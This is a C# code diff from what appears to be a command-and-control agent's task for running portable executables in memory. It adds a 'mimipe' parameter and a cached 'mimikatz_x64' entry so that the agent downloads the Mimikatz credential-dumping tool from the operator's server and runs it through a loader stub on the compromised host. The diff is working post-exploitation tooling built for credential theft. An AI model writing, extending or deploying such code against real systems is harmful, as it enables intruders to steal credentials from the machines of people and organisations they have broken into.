@@ -38,6 +38,8 @@ namespace Tasks
             public string PEArguments;
             [DataMember(Name = "loader_stub_id")]
             public string LoaderStubId;
+            [DataMember(Name = "mimipe")]
+            public string MimiPeFileId;
         }
 
         private AutoResetEvent _senderEvent = new AutoResetEvent(false);
@@ -45,7 +47,7 @@ namespace Tasks
         private JsonSerializer _serializer = new JsonSerializer();
         private AutoResetEvent _complete = new AutoResetEvent(false);
         private Action<object> _sendAction;
-
+        private const string MIMIKATZ_PE_ID = "mimikatz_x64";
         private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
         private bool _completed = false;
@@ -129,7 +131,24 @@ namespace Tasks
                     }
                     else
                     {
-                        if (_agent.GetFileManager().GetFileFromStore(parameters.PEName, out byte[] peBytes))
+                        byte[] peBytes = new byte[0];
+                        
+                        if (!string.IsNullOrEmpty(parameters.MimiPeFileId))
+                        {
+                            if (!_agent.GetFileManager().GetFileFromStore(MIMIKATZ_PE_ID, out peBytes))
+                            {
+                                if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.MimiPeFileId, out peBytes))
+                                {
+                                    _agent.GetFileManager().AddFileToStore(MIMIKATZ_PE_ID, peBytes);
+                                }
+                            }
+                        } else
+                        {
+                            _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
+                        }
+
+
+                        if (peBytes.Length > 0)
                         {
                             if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic))
                             {
@@ -208,7 +227,7 @@ namespace Tasks
                         }
                         else
                         {
-                            resp = CreateTaskResponse($"{parameters.PEName} is not loaded (have you registered it?)", true);
+                            resp = CreateTaskResponse($"{parameters.PEName} is not loaded or is of zero length (have you registered it?)", true);
                         }
                     }
                 }
